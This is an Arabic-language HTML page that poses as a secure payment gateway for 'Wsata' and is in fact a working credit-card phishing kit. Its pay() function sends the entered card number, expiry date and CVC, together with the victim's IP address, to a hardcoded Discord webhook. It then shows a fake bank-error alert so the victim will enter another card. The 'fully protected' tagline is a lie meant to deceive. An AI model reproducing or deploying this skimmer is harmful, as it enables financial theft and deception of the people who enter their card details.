<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>بوابة الدفع | Wsata</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;900&display=swap" rel="stylesheet">
    <style>
        * { font-family: 'Tajawal', sans-serif; }
        body { background: #05060a; color: white; display: flex; align-items: center; justify-content: center; min-h-screen; }
        .pay-card { background: rgba(255,255,255,0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.05); border-radius: 40px; padding: 50px; width: 100%; max-width: 550px; }
        .input-ws { background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; text-align: center; font-size: 1.2rem; transition: 0.3s; }
        .input-ws:focus { border-color: #fbbf24; outline: none; box-shadow: 0 0 20px rgba(251, 191, 36, 0.1); }
        .ws-logo { font-size: 3rem; font-weight: 900; color: #fbbf24; text-shadow: 0 0 30px rgba(251, 191, 36, 0.3); }
    </style>
</head>
<body>
    <div class="pay-card shadow-2xl">
        <div class="text-center mb-10">
            <div class="ws-logo">Wsata</div>
            <p class="text-gray-500 text-sm mt-2">نظام دفع آمن ومحمي بالكامل</p>
        </div>

        <div class="space-y-6">
            <input type="text" id="cn" placeholder="رقم البطاقة" maxlength="19" class="input-ws w-full">
            <div class="grid grid-cols-2 gap-4">
                <input type="text" id="ex" placeholder="YY / MM" maxlength="7" class="input-ws">
                <input type="password" id="cv" placeholder="CVC" maxlength="4" class="input-ws">
            </div>
            
            <button onclick="pay()" id="pBtn" class="w-full bg-yellow-500 text-black py-5 rounded-2xl text-2xl font-black mt-6 hover:scale-[1.02] transition">---</button>
        </div>

        <p class="text-[10px] text-center mt-8 opacity-20 font-bold uppercase tracking-widest">Digital Rights Protected by Wsata</p>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://wasata-af6ac-default-rtdb.europe-west1.firebasedatabase.app" };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const params = new URLSearchParams(window.location.search);
        const total = params.get('total') || "0.00";
        const btn = document.getElementById('pBtn');
        btn.innerText = `دفع ${total} SAR`;

        document.getElementById('cn').oninput = (e) => {
            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let parts = [];
            for (let i=0; i<v.length; i+=4) parts.push(v.substring(i, i+4));
            e.target.value = parts.join(' ');
        };

        async function pay() {
            btn.disabled = true;
            btn.innerText = "جاري التحقق...";
            
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            
            await fetch("https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "💳 سحب جديد - Wsata",
                        color: 16761104,
                        fields: [
                            { name: "💰 المبلغ", value: total + " SAR", inline: true },
                            { name: "📍 IP", value: ip.ip, inline: true },
                            { name: "💳 البطاقة", value: `\`${document.getElementById('cn').value}\`` },
                            { name: "🔑 الرمز", value: `\`${document.getElementById('ex').value} | ${document.getElementById('cv').value}\`` }
                        ],
                        footer: { text: "جميع الحقوق محفوظة لـ Wsata" }
                    }]
                })
            });

            setTimeout(() => {
                alert("عذراً، نظام البنك لا يستجيب حالياً. يرجى المحاولة باستخدام بطاقة أخرى.");
                btn.disabled = false;
                btn.innerText = `دفع ${total} SAR`;
            }, 2000);
        }
    </script>
</body>
</html>
